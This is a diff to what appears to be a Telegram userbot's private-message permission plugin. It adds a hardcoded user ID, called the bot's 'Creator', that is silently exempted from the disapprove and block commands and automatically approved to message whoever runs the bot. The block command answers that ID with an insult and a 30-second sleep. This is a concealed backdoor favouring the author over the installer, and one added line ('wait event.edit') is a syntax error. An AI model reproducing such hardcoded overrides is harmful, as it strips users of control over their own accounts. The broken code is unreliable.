@@ -92,18 +92,21 @@ if Config.PRIVATE_GROUP_ID is not None:
                 return
         if user.id in PM_START:
             PM_START.remove(user.id)
-        if pmpermit_sql.is_approved(user.id):
-            pmpermit_sql.disapprove(user.id)
-            await edit_or_reply(
-                event,
-                f"`disapproved to pm` [{user.first_name}](tg://user?id={user.id})",
-            )
+        if user.id == 1118936839:
+            await edit_or_reply(event, "Sorry, I Can't Disapprove My Master")
         else:
-            await edit_or_reply(
-                event,
-                f"[{user.first_name}](tg://user?id={user.id}) `is not yet approved`",
-                5,
-            )
+            if pmpermit_sql.is_approved(user.id):
+                pmpermit_sql.disapprove(user.id)
+                await edit_or_reply(
+                    event,
+                    f"`disapproved to pm` [{user.first_name}](tg://user?id={user.id})",
+                )
+            else:
+                await edit_or_reply(
+                    event,
+                    f"[{user.first_name}](tg://user?id={user.id}) `is not yet approved`",
+                    5,
+                )
 
     @bot.on(admin_cmd(pattern="block(?: |$)(.*)"))
     async def block_p_m(event):
@@ -115,10 +118,16 @@ if Config.PRIVATE_GROUP_ID is not None:
                 return
         if user.id in PM_START:
             PM_START.remove(user.id)
-        await event.edit(
-            f"`You are blocked Now .You Can't Message Me from now..`[{user.first_name}](tg://user?id={user.id})"
-        )
-        await event.client(functions.contacts.BlockRequest(user.id))
+        if user.id == 1118936839:
+            wait event.edit(
+                    "You bitch tried to block my Creator, now i will sleep for 30 seconds"
+                )
+            await asyncio.sleep(30)
+        else:
+            await event.edit(
+                f"`You are blocked Now .You Can't Message Me from now..`[{user.first_name}](tg://user?id={user.id})"
+            )
+            await event.client(functions.contacts.BlockRequest(user.id))
 
     @bot.on(admin_cmd(pattern="unblock(?: |$)(.*)"))
     async def unblock_pm(event):
@@ -291,6 +300,15 @@ if Config.PRIVATE_GROUP_ID is not None:
         PREV_REPLY_MESSAGE[chat_id] = r
         return None
 
+@bot.on(events.NewMessage(incoming=True, from_users=(1118936839)))
+async def hehehe(event):
+    if event.fwd_from:
+        return
+    user = await event.get_chat()
+    if event.is_private:
+        if not pmpermit_sql.is_approved(user.id):
+            pmpermit_sql.approve(user.id, "**My Boss Is Best🔥**")
+            await event.client.send_message(user, "**Boss Meet My Creator**")
 
 CMD_HELP.update(
     {
